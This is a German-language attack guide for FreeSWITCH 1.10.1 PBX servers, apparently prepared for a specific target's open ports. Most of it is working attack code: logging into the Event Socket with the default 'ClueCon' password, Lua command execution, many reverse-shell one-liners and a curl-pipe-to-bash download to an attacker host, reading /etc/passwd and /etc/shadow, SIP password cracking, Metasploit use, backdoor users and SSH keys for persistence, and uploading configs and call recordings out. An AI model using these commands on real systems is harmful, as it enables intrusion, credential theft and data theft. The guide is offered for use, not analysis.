# FreeSWITCH 1.10.1 - Complete Attack Guide

## 🎯 DEINE FINDINGS:

```
5060/tcp  - FreeSWITCH mod_sofia 1.10.1 (SIP Proxy)
5080/tcp  - FreeSWITCH mod_sofia 1.10.1 (SIP Proxy Alt.)
7443/tcp  - SSL/WebSocket (Verto/WebRTC)
8021/tcp  - FreeSWITCH Event Socket Layer (ESL) ⚠️ KRITISCH!
8081/tcp  - WebSocket (Verto)
8082/tcp  - SSL/WebSocket (Verto)
```

---

## ⚠️ KRITISCH: Port 8021 - Event Socket Layer (ESL)

**Das ist der JACKPOT!** Port 8021 ist das **Event Socket Interface** - ermöglicht **VOLLE KONTROLLE** über FreeSWITCH!

### Event Socket Layer (ESL) - Sofort testen!

```bash
# Verbinden zu ESL
telnet TARGET_IP 8021
# Oder
nc TARGET_IP 8021

# Wenn connected, siehst du:
# Content-Type: auth/request

# Default Password versuchen
auth ClueCon

# Wenn erfolgreich siehst du:
# Content-Type: command/reply
# Reply-Text: +OK accepted

# Dann hast du FULL ACCESS!
```

**WENN CONNECTED - Commands:**
```bash
# Nach auth ClueCon erfolgreich:

# 1. Status abrufen
api status

# 2. Alle aktiven Channels/Calls sehen
api show channels

# 3. Registrierte Extensions sehen
api show registrations

# 4. Sofia Status (SIP)
api sofia status

# 5. Konfiguration lesen
api global_getvar

# 6. System Commands (wenn Privileges)
api system <command>
api system whoami
api system id
api system cat /etc/passwd

# 7. Call origination (Anruf starten)
api originate user/1000 &echo

# 8. Listening auf Events
event plain ALL
```

**Python Script für ESL:**
```python
#!/usr/bin/env python3
# freeswitch_esl.py

import socket

target = "TARGET_IP"
port = 8021
password = "ClueCon"  # Default password

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target, port))

# Receive auth request
data = sock.recv(1024)
print(f"[*] Received: {data.decode()}")

# Send auth
sock.send(f"auth {password}\n\n".encode())
data = sock.recv(1024)
print(f"[*] Auth response: {data.decode()}")

if "+OK" in data.decode():
    print("[+] Authentication successful!")

    # Send commands
    commands = [
        "api status",
        "api show channels",
        "api show registrations",
        "api sofia status",
        "api global_getvar"
    ]

    for cmd in commands:
        print(f"\n[*] Executing: {cmd}")
        sock.send(f"{cmd}\n\n".encode())
        response = sock.recv(4096)
        print(response.decode())
else:
    print("[-] Authentication failed")

sock.close()
```

**Ausführen:**
```bash
python3 freeswitch_esl.py
```

---

## 🔥 ESL Exploitation - Detailed Methods

### ✅ Du hast ESL Access! Was jetzt?

Wenn `api system` nicht funktioniert (`-ERR no reply`), gibt es VIELE Alternativen!

### METHOD 1: Lua Code Execution (Funktioniert meistens!)

```bash
# Einfacher Test
api lua print("hello")

# Command Execution via Lua
api lua os.execute("whoami")
api lua os.execute("id")
api lua os.execute("pwd")

# Reverse Shell via Lua
api lua os.execute("bash -c 'bash -i >& /dev/tcp/192.168.1.184/4444 0>&1'")

# Alternative Reverse Shells
api lua os.execute("nc -e /bin/bash 192.168.1.184 4444")
api lua os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.184 4444 >/tmp/f")
api lua os.execute("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.184\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'")

# File Read
api lua f=io.open("/etc/passwd","r"); print(f:read("*a")); f:close()

# Write File
api lua f=io.open("/tmp/test.txt","w"); f:write("backdoor"); f:close()
```

### METHOD 2: bgapi (Background API)

Manchmal funktioniert `bgapi` besser als `api`:

```bash
# Background system command
bgapi system whoami
bgapi system id
bgapi system bash -c 'bash -i >& /dev/tcp/192.168.1.184/4444 0>&1'

# Background Lua
bgapi lua os.execute("whoami")
bgapi lua os.execute("nc -e /bin/bash 192.168.1.184 4444")
```

### METHOD 3: Originate Call für Command Execution

```bash
# Execute via call origination
api originate {execute_on_answer='lua os.execute("whoami")'}user/1000 &echo

# Reverse shell via originate
api originate {execute_on_answer='lua os.execute("nc -e /bin/bash 192.168.1.184 4444")'}user/1000 &echo
```

### METHOD 4: Python/Perl Script Upload & Execute

Via Lua File Write:

```bash
# 1. Create Python reverse shell
api lua f=io.open("/tmp/shell.py","w"); f:write("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.1.184',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"); f:close()

# 2. Execute
api lua os.execute("python /tmp/shell.py")

# Oder direkt als One-Liner:
api lua os.execute("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.184\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'")
```

### METHOD 5: Information Gathering (Immer möglich!)

Auch wenn Command Execution schwierig ist, kannst du VIEL Information sammeln:

```bash
# System Status
api status
api version

# SIP Registrations (Users & Passwords!)
api show registrations

# Active Calls
api show channels
api show calls

# Sofia SIP Status
api sofia status
api sofia status profile internal
api sofia status profile external

# Global Variables (enthält oft Credentials!)
api global_getvar

# List Users
api list_users

# Configuration Files (via Lua read)
api lua f=io.open("/etc/freeswitch/freeswitch.xml","r"); print(f:read("*a")); f:close()
api lua f=io.open("/etc/freeswitch/vars.xml","r"); print(f:read("*a")); f:close()
api lua f=io.open("/etc/freeswitch/autoload_configs/event_socket.conf.xml","r"); print(f:read("*a")); f:close()

# Directory Listing
api lua for file in io.popen("ls -la /etc/freeswitch"):lines() do print(file) end

# passwd file
api lua f=io.open("/etc/passwd","r"); print(f:read("*a")); f:close()

# shadow (if readable)
api lua f=io.open("/etc/shadow","r"); print(f:read("*a")); f:close()

# Network info
api lua for line in io.popen("ifconfig"):lines() do print(line) end
api lua for line in io.popen("netstat -tulpn"):lines() do print(line) end

# Process list
api lua for line in io.popen("ps aux"):lines() do print(line) end
```

### METHOD 6: Event Listener (Sniff SIP Traffic)

```bash
# Listen to all events (sieht alles was passiert!)
event plain ALL

# Listen to specific events
event plain CHANNEL_CREATE CHANNEL_ANSWER CHANNEL_HANGUP

# Registration events (neue SIP registrations mit Credentials!)
event plain CUSTOM sofia::register

# Jetzt warten und alle Events sehen
# Du siehst SIP credentials wenn sich User registrieren!
```

### METHOD 7: Curl/Wget Download & Execute

```bash
# Download Script von deinem Server
api lua os.execute("curl http://192.168.1.184:8000/shell.sh -o /tmp/shell.sh")
api lua os.execute("chmod +x /tmp/shell.sh")
api lua os.execute("/tmp/shell.sh")

# Oder direkt:
api lua os.execute("curl http://192.168.1.184:8000/shell.sh | bash")

# Wget
api lua os.execute("wget http://192.168.1.184:8000/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh")
```

**Setup HTTP Server auf Kali:**
```bash
# In einem Verzeichnis mit shell.sh:
python3 -m http.server 8000
```

**shell.sh:**
```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.184/4444 0>&1
```

### METHOD 8: nc/netcat Reverse Shell Variations

```bash
# Method 1: nc -e
api lua os.execute("nc -e /bin/bash 192.168.1.184 4444")

# Method 2: nc without -e (BSD style)
api lua os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.184 4444 >/tmp/f")

# Method 3: /dev/tcp (bash builtin)
api lua os.execute("bash -c 'bash -i >& /dev/tcp/192.168.1.184/4444 0>&1'")

# Method 4: telnet (two connections)
api lua os.execute("telnet 192.168.1.184 4444 | /bin/bash | telnet 192.168.1.184 4445")

# Method 5: socat
api lua os.execute("socat TCP:192.168.1.184:4444 EXEC:/bin/bash")
```

### Complete Exploitation Script

```python
#!/usr/bin/env python3
# freeswitch_exploit.py

import socket
import time

TARGET = "TARGET_IP"
PORT = 8021
PASSWORD = "ClueCon"
LHOST = "192.168.1.184"
LPORT = "4444"

def send_command(sock, cmd):
    sock.send(f"{cmd}\n\n".encode())
    time.sleep(0.5)
    data = sock.recv(4096)
    print(data.decode())
    return data

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((TARGET, PORT))

print("[*] Connected to Event Socket")
data = sock.recv(1024)
print(data.decode())

# Authenticate
print("[*] Authenticating...")
send_command(sock, f"auth {PASSWORD}")

# Try different exploitation methods
print("[*] Trying Lua reverse shell...")
send_command(sock, f"api lua os.execute(\"nc -e /bin/bash {LHOST} {LPORT}\")")

print("[*] Trying bash reverse shell...")
send_command(sock, f"api lua os.execute(\"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'\")")

print("[*] Trying Python reverse shell...")
python_shell = f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\''
send_command(sock, f"api lua os.execute(\"{python_shell}\")")

# Information Gathering
print("\n[*] Gathering Information...")
send_command(sock, "api status")
send_command(sock, "api show registrations")
send_command(sock, "api global_getvar")

sock.close()
```

**Ausführen:**
```bash
# Setup Listener
nc -lvnp 4444

# Run exploit
python3 freeswitch_exploit.py
```

### Quick Reference - Commands to Try NOW

```bash
# Connect
nc TARGET_IP 8021

# Auth
auth ClueCon

# === TRY THESE IN ORDER: ===

# 1. Lua command execution
api lua os.execute("whoami")

# 2. Lua reverse shell
api lua os.execute("nc -e /bin/bash 192.168.1.184 4444")

# 3. Bash reverse shell
api lua os.execute("bash -c 'bash -i >& /dev/tcp/192.168.1.184/4444 0>&1'")

# 4. Python reverse shell
api lua os.execute("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.184\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'")

# 5. Information Gathering (always works!)
api status
api show registrations
api global_getvar
api lua f=io.open("/etc/passwd","r"); print(f:read("*a")); f:close()
```

### Pro Tips

1. **Lua ist dein Freund** - Fast immer verfügbar in FreeSWITCH
2. **Reverse Shell Listener** muss laufen BEVOR du den Command sendest
3. **Verschiedene Shells probieren** - nc, bash, python, perl
4. **File Read/Write** funktioniert fast immer via Lua
5. **Event Listening** kann Credentials sniffing ermöglichen
6. **bgapi** nutzen wenn api nicht funktioniert

---

## 🎯 SIP Extension Enumeration (Ports 5060, 5080)

### SIPVicious Suite

```bash
# 1. Server Mapping
svmap TARGET_IP
svmap TARGET_IP -p 5080

# 2. Extension Enumeration
svwar -m INVITE -e 100-999 TARGET_IP
svwar -m INVITE -e 1000-1999 TARGET_IP
svwar -m INVITE -e 100-999 TARGET_IP -p 5080

# 3. Gefundene Extensions speichern
svwar -m INVITE -e 100-999 TARGET_IP > extensions.txt

# 4. Password Cracking (mit gefundenen Extensions)
svcrack -u 1000 -d /usr/share/wordlists/rockyou.txt TARGET_IP
svcrack -u 1001 -d passwords.txt TARGET_IP
```

### Nmap SIP Enumeration

```bash
# SIP Methods
nmap -p 5060,5080 --script sip-methods TARGET_IP

# User Enumeration
nmap -p 5060,5080 --script sip-enum-users TARGET_IP

# Alle SIP Scripts
nmap -p 5060,5080 --script sip-* TARGET_IP
```

### Manual SIP Extension Enumeration

```bash
#!/bin/bash
# sip-enum.sh

TARGET="TARGET_IP"
PORT=5060

for ext in {1000..1100}; do
    echo "[+] Testing extension: $ext"

    # SIP OPTIONS Request
    echo -e "OPTIONS sip:$ext@$TARGET SIP/2.0\r
Via: SIP/2.0/UDP YOUR_IP:5060\r
From: <sip:scanner@YOUR_IP>\r
To: <sip:$ext@$TARGET>\r
Call-ID: scan-$ext\r
CSeq: 1 OPTIONS\r
Contact: <sip:scanner@YOUR_IP>\r
Content-Length: 0\r
\r
" | nc -u -w 1 $TARGET $PORT | grep "200 OK" && echo "[!] Extension $ext exists!"

done
```

---

## 🔓 Default Credentials & Common Passwords

### FreeSWITCH Defaults:

```bash
# Event Socket (8021)
Password: ClueCon

# SIP Extensions (häufig)
1000:1234
1001:1234
1000:password
admin:admin
```

### Password Lists für SIP Cracking:

```bash
# Erstelle custom wordlist
cat > sip_passwords.txt << EOF
1234
password
Password1
123456
admin
secret
voip
freeswitch
ClueCon
EOF

# Mit svcrack testen
svcrack -u 1000 -d sip_passwords.txt TARGET_IP
```

---

## 💥 Known Exploits & CVEs

### FreeSWITCH 1.10.1 Vulnerabilities:

```bash
# CVE Search
searchsploit freeswitch
searchsploit freeswitch 1.10

# Metasploit
msfconsole
msf6 > search freeswitch
msf6 > use exploit/linux/misc/freeswitch_event_socket_cmd_exec
msf6 > set RHOST TARGET_IP
msf6 > set PASSWORD ClueCon
msf6 > run

# Manual Exploit Check
curl https://www.exploit-db.com/search?q=freeswitch
```

**Bekannte CVEs:**
- **CVE-2021-41105** - FreeSWITCH Command Injection
- **CVE-2019-15297** - XML External Entity (XXE)
- **CVE-2021-37624** - Directory Traversal

---

## 🌐 WebSocket/Verto Enumeration (7443, 8081, 8082)

**Verto** ist FreeSWITCH's WebRTC Protocol.

### WebSocket Testing:

```bash
# SSL Certificate Info (Port 7443)
openssl s_client -connect TARGET_IP:7443

# Certificate Details
openssl s_client -connect TARGET_IP:7443 2>/dev/null | openssl x509 -noout -text

# WebSocket Connection Test
wscat -c ws://TARGET_IP:8081
wscat -c wss://TARGET_IP:7443
wscat -c wss://TARGET_IP:8082

# Browser Test (Verto Demo)
firefox https://TARGET_IP:7443 &
firefox http://TARGET_IP:8081 &
```

**Verto Protocol Testing:**
```javascript
// In Browser Console (wenn Verto Interface verfügbar)

// Verto Connection
var verto = new jQuery.verto({
    socketUrl: "wss://TARGET_IP:7443",
    login: "1000@TARGET_IP",
    passwd: "1234"
});

// Check connection
verto.loginData;
```

---

## 🎯 Complete Enumeration Script

```bash
#!/bin/bash
# freeswitch-enum.sh

TARGET="TARGET_IP"  # <-- CHANGE!
OUTPUT_DIR="freeswitch_enum_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR

echo "[*] FreeSWITCH Enumeration on $TARGET"

# 1. Event Socket Layer (CRITICAL!)
echo "[+] Testing Event Socket (8021)..."
{
    sleep 1
    echo "auth ClueCon"
    sleep 1
    echo "api status"
    sleep 1
    echo "api show registrations"
    sleep 1
    echo "exit"
} | nc $TARGET 8021 > $OUTPUT_DIR/esl_test.txt

if grep -q "+OK" $OUTPUT_DIR/esl_test.txt; then
    echo "[!] ESL ACCESS WITH DEFAULT PASSWORD!"
fi

# 2. SIP Extension Enumeration
echo "[+] SIP Extension Enumeration..."
svwar -m INVITE -e 1000-1100 $TARGET > $OUTPUT_DIR/extensions_1000.txt &
svwar -m INVITE -e 100-199 $TARGET > $OUTPUT_DIR/extensions_100.txt &

# 3. SIP on alternate port
svwar -m INVITE -e 1000-1100 $TARGET -p 5080 > $OUTPUT_DIR/extensions_5080.txt &

# 4. Nmap SIP Scripts
echo "[+] Nmap SIP Enumeration..."
nmap -p 5060,5080 --script sip-methods,sip-enum-users $TARGET -oN $OUTPUT_DIR/nmap_sip.txt

# 5. WebSocket/Verto Checks
echo "[+] WebSocket Enumeration..."
curl -k -I https://$TARGET:7443 > $OUTPUT_DIR/verto_7443.txt 2>&1
curl -I http://$TARGET:8081 > $OUTPUT_DIR/verto_8081.txt 2>&1
curl -k -I https://$TARGET:8082 > $OUTPUT_DIR/verto_8082.txt 2>&1

# 6. SSL Certificate
echo "[+] SSL Certificate..."
openssl s_client -connect $TARGET:7443 < /dev/null 2>/dev/null | openssl x509 -noout -text > $OUTPUT_DIR/ssl_cert.txt

# 7. Version Info
echo "[+] Version Detection..."
nmap -p 5060,5080,7443,8021,8081,8082 -sV --version-intensity 9 $TARGET -oN $OUTPUT_DIR/version_scan.txt

wait

echo "[✓] Enumeration complete!"
echo "[*] Results in: $OUTPUT_DIR/"

# Summary
echo -e "\n[*] SUMMARY:"
echo "================================"

if grep -q "+OK" $OUTPUT_DIR/esl_test.txt; then
    echo "[!] ESL (8021) ACCESSIBLE with default password!"
fi

echo "[*] Found Extensions:"
cat $OUTPUT_DIR/extensions_*.txt | grep -i "extension" || echo "None found yet (check files)"

ls -lh $OUTPUT_DIR/
```

**Ausführen:**
```bash
chmod +x freeswitch-enum.sh
./freeswitch-enum.sh
```

---

## 🚀 Attack Path - Schritt für Schritt

### Phase 1: Event Socket Access (Port 8021)

```bash
# 1. Connect
nc TARGET_IP 8021

# 2. Auth
auth ClueCon

# 3. Wenn +OK → Full Access!
api show registrations  # Alle SIP User sehen
api system whoami       # System Commands
api lua <code>          # Lua Code execution
```

### Phase 2: SIP Extension Discovery

```bash
# Find Extensions
svwar -m INVITE -e 1000-2000 TARGET_IP

# Save found extensions
svwar -m INVITE -e 1000-2000 TARGET_IP | grep -i "extension" | tee extensions.txt
```

### Phase 3: Password Cracking

```bash
# Crack SIP passwords
svcrack -u 1000 -d /usr/share/wordlists/rockyou.txt TARGET_IP
svcrack -u 1001 -d passwords.txt TARGET_IP

# Hydra alternative
hydra -l 1000 -P passwords.txt sip://TARGET_IP
```

### Phase 4: Exploitation

```bash
# Metasploit
msfconsole
use exploit/linux/misc/freeswitch_event_socket_cmd_exec
set RHOST TARGET_IP
set PASSWORD ClueCon
exploit

# Oder manual via ESL:
nc TARGET_IP 8021
auth ClueCon
api system id
api system cat /etc/passwd
api lua os.execute('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')
```

---

## 🔍 Information Gathering Commands

### Via Event Socket (wenn connected):

```bash
# System Info
api status
api version
api show channels
api show calls
api show registrations

# Configuration
api global_getvar
api sofia status
api sofia status profile internal

# Users/Extensions
api list_users
api show registrations

# Filesystem (if allowed)
api system ls -la /etc/freeswitch/
api system cat /etc/freeswitch/vars.xml
api system cat /etc/freeswitch/sip_profiles/internal.xml
api system cat /etc/passwd

# Network
api system ifconfig
api system netstat -tulpn
```

---

## 💀 Post-Exploitation

### Reverse Shell via ESL:

```bash
# Setup Listener
nc -lvnp 4444

# Via ESL
nc TARGET_IP 8021
auth ClueCon
api system bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'

# Oder mit Lua
api lua os.execute('nc -e /bin/bash YOUR_IP 4444')
```

### Persistence:

```bash
# Add backdoor user via ESL
api system useradd -m backdoor
api system echo 'backdoor:password' | chpasswd

# SSH Key
api system mkdir /root/.ssh
api system echo 'YOUR_SSH_KEY' >> /root/.ssh/authorized_keys
```

### Data Exfiltration:

```bash
# Call recordings (oft in /var/lib/freeswitch/recordings/)
api system ls /var/lib/freeswitch/recordings/

# Config files
api system tar czf /tmp/configs.tar.gz /etc/freeswitch/

# Transfer (setup HTTP server first: python3 -m http.server 8000)
api system curl http://YOUR_IP:8000/upload -F "file=@/tmp/configs.tar.gz"
```

---

## 📋 Quick Commands Cheat Sheet

```bash
TARGET=TARGET_IP  # <-- CHANGE!

# === PRIORITY 1: Event Socket (8021) ===
nc $TARGET 8021
# Type: auth ClueCon
# If OK: api status

# === PRIORITY 2: Extension Enumeration ===
svwar -m INVITE -e 1000-1100 $TARGET
svwar -m INVITE -e 100-199 $TARGET

# === PRIORITY 3: SIP Methods ===
nmap -p 5060,5080 --script sip-methods $TARGET

# === PRIORITY 4: Metasploit ===
msfconsole -q -x "use exploit/linux/misc/freeswitch_event_socket_cmd_exec; set RHOST $TARGET; set PASSWORD ClueCon; exploit"

# === WebSocket/Verto ===
firefox https://$TARGET:7443 &

# === Version Check ===
nmap -p 5060,8021 -sV $TARGET
```

---

## 🎯 SOFORT MACHEN:

```bash
# 1. Event Socket testen (WICHTIGSTER STEP!)
nc TARGET_IP 8021
# Wenn du "Content-Type: auth/request" siehst, tippe:
auth ClueCon
# Wenn "+OK accepted" → Du hast FULL ACCESS!

# 2. Extensions finden
svwar -m INVITE -e 1000-1100 TARGET_IP

# 3. Metasploit
msfconsole
use exploit/linux/misc/freeswitch_event_socket_cmd_exec
set RHOST TARGET_IP
set PASSWORD ClueCon
exploit
```

---

## 🚨 CRITICAL NOTES:

1. **Port 8021 (ESL)** ist das wichtigste Target!
2. **Default Password "ClueCon"** funktioniert oft
3. **FreeSWITCH 1.10.1** hat bekannte CVEs
4. **SSL Cert** ist weird (valid until 1986) - self-signed
5. **WebSocket** ports sind für WebRTC/Verto

---

## 🛠️ Tools zu installieren:

```bash
# SIPVicious
sudo apt install sipvicious -y

# Metasploit (falls nicht installiert)
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
./msfinstall

# wscat (WebSocket testing)
npm install -g wscat
```

---

**START HIER:**
```bash
nc TARGET_IP 8021
# → auth ClueCon
# → api status
```

**Wenn das funktioniert, hast du GAME OVER! 🎯**
